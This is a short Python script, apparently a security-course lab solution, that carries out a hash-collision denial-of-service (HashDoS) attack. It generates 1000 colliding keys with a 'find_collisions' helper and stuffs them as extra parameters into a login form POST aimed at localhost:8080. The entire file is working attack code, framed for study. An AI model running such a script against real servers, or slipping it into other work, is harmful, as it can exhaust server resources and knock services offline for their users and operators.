# importing necessary files/libraries
from requests import codes, Session
from collisions import find_collisions

LOGIN_FORM_URL = "http://localhost:8080/login"

# This function will send the login form
# with the colliding parameters you specify.
def do_login_form(sess, username,password,params=None):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	if not params is None:
		data_dict.update(params)
	response = sess.post(LOGIN_FORM_URL,data_dict)
	print(response) 

# hashdos method to perform our attack
def do_attack():
	# initialize a session
	sess = Session()
	# Choose any valid username and password
	uname ="victim"
	pw = "victim"
	# Calculate 1000 collisions using the following key. Add each colliding
	# string to the dictionary as keys. The values for each key are arbitrary.
	key = b'\x00'*16
	colls = find_collisions(key, 1000)
	attack_dict = {}
	for coll in colls:
		attack_dict[coll] = 1
	# call the do_login_form function with our parameters
	response = do_login_form(sess, uname,pw,attack_dict)

# main method calls our hashdos attack
if __name__=='__main__':
	do_attack()
